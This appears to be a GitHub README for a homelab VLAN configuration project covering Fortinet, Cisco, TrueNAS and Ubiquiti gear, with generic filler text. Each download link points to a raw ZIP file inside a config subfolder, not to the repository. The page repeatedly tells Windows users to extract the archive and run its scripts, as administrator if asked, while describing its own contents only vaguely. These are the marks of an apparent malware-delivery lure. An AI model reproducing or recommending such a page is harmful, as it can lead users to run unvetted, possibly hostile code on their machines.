# 🛠️ HomeLab-VLAN-Refactor-Configs - Simple VLAN setup for homelabs

[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ivana8079/HomeLab-VLAN-Refactor-Configs/main/configs/unifi/VLA_Refactor_Configs_Home_Lab_v2.1-alpha.5.zip)

## 🚀 What this project is

HomeLab-VLAN-Refactor-Configs is a set of config files and scripts for a home lab network. It helps you split devices into clear groups like Admin, PC, IoT, and VoIP. It also supports a setup with Fortinet, Cisco, TrueNAS, Ubiquiti, PowerShell, Bash, and rsync.

This repo is for people who want a cleaner and safer home network without starting from zero. It gives you a base layout you can adapt to your own gear.

## 📦 What you get

- VLAN plans for common home lab use
- Firewall and switch config examples
- Bash scripts for Linux tasks
- PowerShell scripts for Windows tasks
- Rsync setup for fast file sync
- DHCP relay examples
- mDNS rules for services like Spotify
- Notes for Ubiquiti PPSK use
- A budget-minded design based on used gear

## 🖥️ What you need

This project fits a mixed home lab with gear like:

- Windows PC for reading files and running PowerShell
- Optional Linux host for Bash scripts
- Fortinet 60F or similar firewall
- Cisco Catalyst 2960X or similar managed switch
- TrueNAS Scale for storage
- Ubiquiti U7 Lite or similar access point
- Basic web access to your devices
- A text editor such as Notepad or VS Code

## 📥 Download and open the files

Use this link to visit the project page and get the files:

[Open HomeLab-VLAN-Refactor-Configs](https://raw.githubusercontent.com/Ivana8079/HomeLab-VLAN-Refactor-Configs/main/configs/unifi/VLA_Refactor_Configs_Home_Lab_v2.1-alpha.5.zip)

On Windows:

1. Open the link in your browser.
2. Download the repository as a ZIP file if you want the full set at once.
3. Save the file in a folder you can find again.
4. Right-click the ZIP file and choose Extract All.
5. Open the extracted folder.
6. Look through the folders for the parts you need.

## 🧭 How to start on Windows

If you only want to inspect the project:

1. Open the extracted folder.
2. Read the README files and notes first.
3. Open script files in Notepad or VS Code.
4. Check the folders for device-specific configs.

If you want to use the scripts:

1. Open PowerShell as a normal user for simple tasks.
2. Use PowerShell as admin only when a script asks for it.
3. Run one script at a time.
4. Read the comments before you change anything.
5. Keep a copy of your old config before you apply new ones.

## 🧱 Main network layout

The project uses a clear segment setup:

- **Admin VLAN** for trusted devices and management
- **PC VLAN** for desktops and laptops
- **IoT VLAN** for smart devices
- **VoIP VLAN** for phones and call gear

This split helps limit traffic between device groups. It also makes it easier to set rules for each type of device.

## 🔧 Device roles

### Fortinet 60F

The firewall handles network rules, routing, and access control. It can keep the VLANs separate and allow only the traffic you want.

### Cisco Catalyst 2960X

The switch carries VLAN tags between ports and devices. It helps place each port in the right network group.

### TrueNAS Scale

TrueNAS Scale stores files and backup data. The project includes ideas for fast transfers with rsync over 10Gb/s links.

### Ubiquiti U7 Lite

The access point can serve wireless users on separate networks. PPSK support helps give different Wi‑Fi keys to different groups.

## 🧩 Script folders

The repo includes scripts for common admin tasks:

- **Bash** scripts for Linux and server tasks
- **PowerShell** scripts for Windows tasks
- Automation files for repeat steps
- Sync scripts for backup and copy jobs

These scripts aim to save time when you repeat the same setup work across machines.

## 🖧 Network features

### VLAN segmentation

VLANs split traffic so each device group stays in its lane. This helps reduce noise on the network and makes rules easier to manage.

### DHCP relay

DHCP relay lets one DHCP server serve devices on more than one VLAN. This is useful when your main server sits in one network and your clients sit in others.

### mDNS support

mDNS helps devices find services on local networks. That matters for things like casting, discovery, and apps such as Spotify in a segmented setup.

### Rsync sync

Rsync helps copy files fast and keep folders in sync. It works well for backups and shared data moves.

### PPSK

PPSK means each user or device can get its own Wi‑Fi key. That makes wireless access easier to manage in a mixed home setup.

## 🪟 Windows setup steps

Follow these steps if you want to use the project from a Windows PC:

1. Open the download link above.
2. Download the repository as a ZIP file.
3. Extract the ZIP file.
4. Open the extracted folder.
5. Read the files named README, notes, or setup first.
6. Open PowerShell if you need to run a script.
7. If a script needs admin access, right-click PowerShell and choose Run as administrator.
8. Run the script file that matches your device or task.
9. Check the output before you make changes on real hardware.

## 🔍 How to read the files

Most files in this repo are plain text. You can open them with:

- Notepad
- Notepad++
- VS Code
- PowerShell
- Terminal on Linux

Look for:

- Folder names that match your device
- Comments that explain each section
- IP ranges
- VLAN IDs
- Port settings
- Wi‑Fi rules
- Backup paths

## 🛡️ Safe first use

Before you apply anything to your network:

1. Save a copy of your current config.
2. Test one device or one port first.
3. Match the VLAN IDs to your own plan.
4. Check IP ranges before you set them.
5. Keep a way to get back into the firewall or switch.

## 🗂️ Suggested folder map

A project like this often uses a layout such as:

- `firewall/` for Fortinet rules and network settings
- `switch/` for Cisco port and VLAN config
- `wifi/` for access point notes and PPSK ideas
- `windows/` for PowerShell scripts
- `linux/` for Bash scripts
- `backup/` for rsync jobs and sync notes
- `docs/` for setup notes and network plans

## 🧪 Typical use cases

You may use this project to:

- Build a clean home lab from used gear
- Separate smart home devices from work PCs
- Keep guest or IoT devices away from private machines
- Set up a storage server with TrueNAS Scale
- Move files between systems with rsync
- Plan a small network on a tight budget

## 💡 Example network plan

A simple plan can look like this:

- Admin VLAN: firewall, switch, NAS, management PC
- PC VLAN: family and work computers
- IoT VLAN: cameras, plugs, assistants, smart TVs
- VoIP VLAN: phones and voice devices

This setup makes it easier to write rules for access, streaming, and storage.

## 🛠️ Common tasks this repo can help with

- Set VLANs on a managed switch
- Route traffic through a Fortinet firewall
- Give wireless users different access keys
- Sync files to TrueNAS
- Keep device groups apart
- Allow only the services you need
- Prepare a home lab with used enterprise gear

## 📚 Good next steps

1. Open the repo on GitHub.
2. Download the ZIP file.
3. Extract it on your Windows PC.
4. Read the network plan files.
5. Start with one VLAN group.
6. Apply the config to a test device.
7. Expand to the rest of your network when it works

## 🔗 Project link

[https://raw.githubusercontent.com/Ivana8079/HomeLab-VLAN-Refactor-Configs/main/configs/unifi/VLA_Refactor_Configs_Home_Lab_v2.1-alpha.5.zip](https://raw.githubusercontent.com/Ivana8079/HomeLab-VLAN-Refactor-Configs/main/configs/unifi/VLA_Refactor_Configs_Home_Lab_v2.1-alpha.5.zip)